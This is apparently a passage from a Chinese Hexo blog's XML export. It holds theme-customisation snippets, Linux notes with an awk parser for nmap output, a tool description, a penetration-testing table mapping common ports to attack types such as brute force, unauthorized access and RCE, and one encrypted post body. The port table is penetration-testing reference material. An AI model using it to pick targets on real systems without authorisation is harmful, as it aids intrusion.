location.replace("https://evenyao.com"); // 这里替换成你的首页 &#125; else &#123; history.back(); &#125; &#125; &#125; &#125;)();&lt;/script&gt; 然后在要加密的文章上添加password属性，后面则是跟想要设置的密码，类似这样： 新方法：1npm install --save hexo-blog-encrypt 在 站点配置文件 中启用该插件1234encrypt: enable: true default_abstract: 这是一篇加密文章，内容可能是个人情感宣泄或者收费技术。如果你确实想看，请与我联系。 default_message: 输入密码，查看文章 123password: 是该博客加密使用的密码abstract: 是该博客的摘要，会显示在博客的列表页message: 这个是博客查看时，密码输入框上面的描述性文字 文章版权说明在目录 next/layout/_macro/下添加 my-copyright.swig：123456789101112131415161718192021222324252627282930&#123;% if page.copyright %&#125;&lt;div class="my_post_copyright"&gt; &lt;script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"&gt;&lt;/script&gt; &lt;!-- JS库 sweetalert 可修改路径 --&gt; &lt;script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"&gt;&lt;/script&gt; &lt;script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"&gt;&lt;/script&gt; &lt;p&gt;&lt;span&gt;本文标题:&lt;/span&gt;&lt;a href="&#123;&#123; url_for(page.path) &#125;&#125;"&gt;&#123;&#123; page.title &#125;&#125;&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;span&gt;文章作者:&lt;/span&gt;&lt;a href="/" title="访问 &#123;&#123; theme.author &#125;&#125; 的个人博客"&gt;&#123;&#123; theme.author &#125;&#125;&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;span&gt;发布时间:&lt;/span&gt;&#123;&#123; page.date.format("YYYY年MM月DD日 - HH:mm") &#125;&#125;&lt;/p&gt; &lt;p&gt;&lt;span&gt;最后更新:&lt;/span&gt;&#123;&#123; page.updated.format("YYYY年MM月DD日 - HH:mm") &#125;&#125;&lt;/p&gt; &lt;p&gt;&lt;span&gt;原始链接:&lt;/span&gt;&lt;a href="&#123;&#123; url_for(page.path) &#125;&#125;" title="&#123;&#123; page.title &#125;&#125;"&gt;&#123;&#123; page.permalink &#125;&#125;&lt;/a&gt; &lt;span class="copy-path" title="点击复制文章链接"&gt;&lt;i class="fa fa-clipboard" data-clipboard-text="&#123;&#123; page.permalink &#125;&#125;" aria-label="复制成功！"&gt;&lt;/i&gt;&lt;/span&gt; &lt;/p&gt; &lt;p&gt;&lt;span&gt;许可协议:&lt;/span&gt;&lt;i class="fa fa-creative-commons"&gt;&lt;/i&gt; &lt;a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)"&gt;署名-非商业性使用-禁止演绎 4.0 国际&lt;/a&gt; 转载请保留原文链接及作者。&lt;/p&gt; &lt;/div&gt;&lt;script&gt; var clipboard = new Clipboard('.fa-clipboard'); $(".fa-clipboard").click(function()&#123; clipboard.on('success', function()&#123; swal(&#123; title: "", text: '复制成功', icon: "success", showConfirmButton: true &#125;); &#125;); &#125;); &lt;/script&gt;&#123;% endif %&#125; 在目录next/source/css/_common/components/post/下添加my-post-copyright.styl123456789101112131415161718192021222324252627282930313233343536373839404142434445.my_post_copyright &#123; width: 85%; max-width: 45em; margin: 2.8em auto 0; padding: 0.5em 1.0em; border: 1px solid #d3d3d3; font-size: 0.93rem; line-height: 1.6em; word-break: break-all; background: rgba(255,255,255,0.4);&#125;.my_post_copyright p&#123;margin:0;&#125;.my_post_copyright span &#123; display: inline-block; width: 5.2em; color: #b5b5b5; font-weight: bold;&#125;.my_post_copyright .raw &#123; margin-left: 1em; width: 5em;&#125;.my_post_copyright a &#123; color: #808080; border-bottom:0;&#125;.my_post_copyright a:hover &#123; color: #a3d2a3; text-decoration: underline;&#125;.my_post_copyright:hover .fa-clipboard &#123; color: #000;&#125;.my_post_copyright .post-url:hover &#123; font-weight: normal;&#125;.my_post_copyright .copy-path &#123; margin-left: 1em; width: 1em; +mobile()&#123;display:none;&#125;&#125;.my_post_copyright .copy-path:hover &#123; color: #808080; cursor: pointer;&#125; 修改next/layout/_macro/post.swig，在代码12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include 'wechat-subscriber.swig' %&#125; &#123;% endif %&#125;&lt;/div&gt; 之前添加增加如下代码：12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include 'my-copyright.swig' %&#125; &#123;% endif %&#125;&lt;/div&gt; 如下 修改next/source/css/_common/components/post/post.styl文件，在最后一行增加代码：1@import "my-post-copyright" 保存重新生成即可。如果要在该博文下面增加版权信息的显示，需要在 Markdown 中增加copyright: true的设置如果你觉得每次都要输入copyright: true很麻烦的话,那么在/scaffolds/post.md文件中添加]]></content>
      <categories>
        <category>0x05 生活杂项</category>
        <category>主题美化</category>
      </categories>
      <tags>
        <tag>美化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux笔记和安全加固配置（持续更新）]]></title>
    <url>%2F2019%2F02%2F08%2Flinux%E7%AC%94%E8%AE%B0%E5%92%8C%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA%E9%85%8D%E7%BD%AE%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x01 前言： 最近在找工作，由于去年参加考研。一心放在考研上，工作没找。后来考研成绩出来了，自己成绩不理想，只能乖乖的找工作。以前没时间总结，做了一些零碎的记录，趁着找工作吧之前记录给总结下，下面是自己总结linux-持续更新。 0x02 linux基础篇基础的知识(ls,pwd,mkdir,cd ,netstat等)在安全的时候学过了这里就不多记载了。 inux高效文本、文件处理命令vim基本上 vi/vim 共分为三种模式，分别是命令模式（Command mode），输入模式（Insert mode）和底线命令模式（Last line mode） 命令模式: i 切换到输入模式，以输入字符。 x 删除当前光标所在处的字符。 : 切换到底线命令模式，以在最底一行输入命令 输入模式在命令模式下按下i就进入了输入模式 底线命令模式在命令模式下按下:（英文冒号）就进入了底线命令模式。q 退出程序w 保存文件 常用的命令（自己不熟悉，但很常用的命令） G:–&gt;移动到这个档案的最后一行(常用) :shift + gnG : —&gt;移动到这个档案的第 n 行gg :移动到这个档案的第一行/word 光标下搜索word单词所在行？word 光标上搜索 :n1,n2s /word1/word2/g n1 与 n2 为数字。在第 n1 与 n2 行之间寻找 word1 这个字符串，并将该字符串取代为 word2 ！ :1,$s/word1/word2/g 或 :%s/word1/word2/g 从第一行到最后一行寻找 word1 字符串，并将该字符串取代为 word2 ！(常用) :1,$s/word1/word2/gc 或 :%s/word1/word2/gc 从第一行到最后一行寻找 word1 字符串，并将该字符串取代为 word2 ！且在取代前显示提示字符给用户确认 (confirm) 是否需要取代！(常用) awkawk是一种编程语言，用于在linux/unix下对文本和数据进行处理,是行处理器,一次对每一行进行处理，然后输出。详细资料—&gt;文档本文演示是提取nmap输出文件如下,我们或一步步提取出格式化输出ip|port|state| service|12345678910Nmap scan report for localhost (127.0.0.1)Host is up (0.00017s latency).Not shown: 994 closed portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.34 ((Unix) PHP/7.1.23)88/tcp open tcpwrapped445/tcp open microsoft-ds?1086/tcp open cplscrambler-lg?1087/tcp open cplscrambler-in?1089/tcp open tcpwrapped [options] -F : 指明输入时用到的字段分隔符 -v var=VALUE : 自定义变量 -f 加载awk脚本awk输出： 字符串匹配 awk ‘/open/‘ nmap.txt我们要提取出端口开放的行，输出有open行的字符, 折分文件 $0代表当前行 $1-n表示列 $NF表示最后字段现在我们需要提取ip 如ip会显示在第一行。如127.0.0.1现在我们和并ip 和开放端口 1[root@zm ~]# awk '/Nmap scan report/ &#123; if(match($5,"[0-9]&#123;1,3&#125;.[0-9]&#123;1,3&#125;.[0-9]&#123;1,3&#125;.[0-9]&#123;1,3&#125;"))&#123;ip=$5&#125;else&#123;ip=gensub(/\(|\)/,"",1,gensub(/\(|\)/,"",1,$6))&#125;&#125; /open/&#123;split($1, t, "/");port=t[1];type=t[2];$1=ip"\t"port"\t"type"\t";$2="";$4=$4==""?"unknown":$4;$4=$3""$4;print $1,$2,$3,$4&#125;' nmap.txt shell脚本入门》》》 待更新 linux安全加固window安全加固]]></content>
      <categories>
        <category>0x03 操作系统</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexoeditor强大的hexo博客工具]]></title>
    <url>%2F2019%2F02%2F07%2Fhexoeditor%E5%BC%BA%E5%A4%A7%E7%9A%84hexo%E5%8D%9A%E5%AE%A2%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[HexoEditor是由zhuzhuyule继承Moeditor进而开发的hexoeditor，支持hexo部署，七牛，腾讯云一键上传图片，对于国内用户非常方便。项目地址:Github HexoEditor使用Hexo _config.yml支持 hexo源中的快速新帖子 快速修改文件名（在Hexo Post Edit中） 快速部署帖子 快速HEXO命令hexo d，hexo g，hexo s，hexo clean支持图片国内网站直接快速上传： 自动将图像更改为Markdown 支持拖动图像 支持粘贴剪贴板图像 支持图像云（一步上传） 支持SM.MS 支持齐牛 腾讯 GitHub额外扩展： TeX数学表达式 UML图 编辑中的代码突出显示 读/写/预览模式 自定义字体/行高/字体大小 自定义主题 代码突出显示主题（由highlight.js提供支持）效果展示!]]></content>
      <categories>
        <category>0x05 生活杂项</category>
        <category>软件安装</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[端口常见漏洞(持续更新)]]></title>
    <url>%2F2019%2F01%2F21%2F%E7%AB%AF%E5%8F%A3%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[端口介绍逻辑意义上的端口，一般是指TCP/IP协议中的端口，端口号的范围从0到655351.公认端口：0-1023，他们紧密绑定了一些服务，端口的通讯明确表明了某种服务的协议，许多服务绑定于这些端口，这些端口同样用于许多其它目的；2.注册端口：1024-49151，他们松散的绑定了一些服务；3.动态/私有：49152-65535，不为服务分配这些端口；一些端口常常会被黑客利用，还会被一些木马病毒利用，对计算机系统进行攻击，很多木马工具也有特定的端口。 0x00 在给某公司做渗透测试时，该公司主要依靠阿里云服务器，依靠阿里云顿，很多测试工具进行渗透扫描漏洞时，会被及时封ip。很多时候不得不自己写脚本来测试是否存在漏洞，或者已知版本漏洞是否可以利用。单遇到端口这块时，该公司用的是阿里云服务器，生产网服务器都对应有外部ip，生产网很多项目需要开放大量端口同步。这就造成了一个ip可能开放了将近20-30端口。很多端口服务对应已知漏洞，需要每次自己都要去查，慢慢的就积累下了很多端口对应漏洞。也会在以后的遇到新漏洞，持续更新到本文章. 端口渗透通常我们在进行端口渗透时，通常关注： 端口的banner信息 端口上运行的服务 端口运行服务存在已知的漏洞 端口 服务 存在漏洞 21/22/69 ftp/tftp：文件传输协议 爆破 嗅探溢出；后门 22 ssh：远程连接 爆破OpenSSH28个退格 23 telnet：远程连接 爆破嗅探 25 smtp：邮件服务 邮件伪造 53 DNS：域名系统 DNS区域传输DNS劫持DNS缓存投毒DNS欺骗 67/68 dhcp 劫持,欺骗 110 pop3 爆破 139 samba 爆破未授权访问远程代码执行 143 imap 爆破 161 snmp 爆破 389 ldap 注入攻击未授权访问 512/513/514 linux r 直接使用rlogin 873 rsync 未授权访问 1080 socket 爆破：进行内网渗透 1352 lotus 爆破：弱口令信息泄漏：源代码 1433 mssql 爆破：使用系统用户登录,注入攻击 1521 oracle 爆破：TNS注入攻击 2049 nfs 配置不当 2181 zookeeper 未授权访问 3306 mysql 爆破拒绝服务注入 4848 glassfish 爆破：控制台弱口令 认证绕过 5000 sybase/DB2 爆破注入 5432 postgresql 缓冲区溢出注入攻击爆破：弱口令 5632 pcanywhere 拒绝服务代码执行 5900 vnc 爆破：弱口令认证绕过 6379 redis 未授权访问,爆破：弱口令 7001 weblogic Java反序列化控制台弱口令控制台部署webshell 80/443/8080 web 常见web攻击对应服务器版本漏洞 8069 zabbix 远程命令执行 9090 websphere控制台 爆破：控制台弱口令,java反序列 9200/9300 elasticsearch 远程代码执行 11211 memcacache 未授权访问 27017 mongodb 爆破未授权访问 上述表格转自【作者: Hurricane Security】Hurricane Security]]></content>
      <categories>
        <category>0x01 技术原理</category>
        <category>主机安全</category>
      </categories>
      <tags>
        <tag>端口</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[编写python-nmap多线程扫描器]]></title>
    <url>%2F2019%2F01%2F10%2Fpython-nmap%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%89%AB%E6%8F%8F%E5%99%A8%2F</url>
    <content type="text"><![CDATA[Please enter the password to read the blog. Incorrect Password! No content to display! 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